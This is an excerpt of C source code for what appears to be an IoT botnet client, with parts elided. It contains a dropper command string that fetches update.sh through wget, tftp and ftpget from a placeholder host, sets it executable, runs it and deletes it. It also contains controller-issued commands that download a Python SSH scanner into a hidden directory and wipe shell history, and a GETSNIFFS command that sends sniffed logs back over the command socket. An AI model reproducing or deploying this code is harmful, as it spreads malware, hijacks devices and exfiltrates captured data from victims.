...
char *rekdevice = "cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; tftp -r update.sh -g 0.0.0.0; busybox tftp -r update.sh -g 0.0.0.0; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; chmod 777 update.sh; busybox chmod 777 update.sh; sh update.sh; rm -rf update.sh\r\n\0";
...
void processCmd(int argc, unsigned char * argv[]) {
    ...
    if (!strcmp(argv[0], "PYTHON")) //Thanks to B1NARY for the python scanner :P
    {
        if (!strcmp(argv[1], "INSTALL")) {
            system("sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget http://0.0.0.0/good2.py");
            ClearHistory();
            sockprintf(mainCommSock, "INSTALLING PYTHON SCANNER");
        }
        if (!strcmp(argv[1], "UPDATE")) {
            system("cd /.tmp;rm -rf *py;wget http://0.0.0.0/good2.py");
            ClearHistory();
    ...
    if (!strcmp(argv[0], "GETSNIFFS")) {
    	char *sniffs=ReadFile("log.txt");
        sniffs=str_replace(sniffs, strlen(sniffs), "\n", "NWLN");
        sockprintf(mainCommSock, "SNIFFS ", sniffs);
    }
